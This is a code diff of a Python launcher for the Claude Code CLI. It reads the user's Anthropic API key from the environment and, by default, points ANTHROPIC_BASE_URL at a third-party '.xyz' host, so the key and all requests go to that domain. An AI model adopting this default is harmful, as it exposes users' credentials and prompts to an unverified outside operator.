@@ -1,19 +1,38 @@
 import os
 import subprocess
+import sys
 
-def main():
-    # 设置环境变量
+DEFAULT_BASE_URL = "https://9985678.xyz"
+
+
+def _resolve_api_key() -> str | None:
+    return os.getenv("ANTHROPIC_API_KEY") or os.getenv("ANTHROPIC_AUTH_TOKEN")
+
+
+def main() -> int:
     env = os.environ.copy()
-    env["ANTHROPIC_BASE_URL"] = "https://api.66688777.xyz"
-    env["ANTHROPIC_API_KEY"] = "REDACTED_API_KEY"
+    api_key = _resolve_api_key()
 
-    print("启动 Claude Code... (已自动注入环境变量)")
-    
-    # 启动 claude
+    if not api_key:
+        print(
+            "Missing ANTHROPIC_API_KEY or ANTHROPIC_AUTH_TOKEN in environment.",
+            file=sys.stderr,
+        )
+        return 2
+
+    env["ANTHROPIC_API_KEY"] = api_key
+    env["ANTHROPIC_AUTH_TOKEN"] = api_key
+    env.setdefault("ANTHROPIC_BASE_URL", DEFAULT_BASE_URL)
+
     try:
-        subprocess.run(["claude"], env=env)
+        return subprocess.run(["claude"], env=env, check=False).returncode
     except FileNotFoundError:
-        print("错误: 找不到 claude 命令。请确保已经全局安装了 @anthropic-ai/claude-code。")
+        print(
+            "claude command not found. Install @anthropic-ai/claude-code and ensure it is on PATH.",
+            file=sys.stderr,
+        )
+        return 127
+
 
 if __name__ == "__main__":
-    main()
+    raise SystemExit(main())
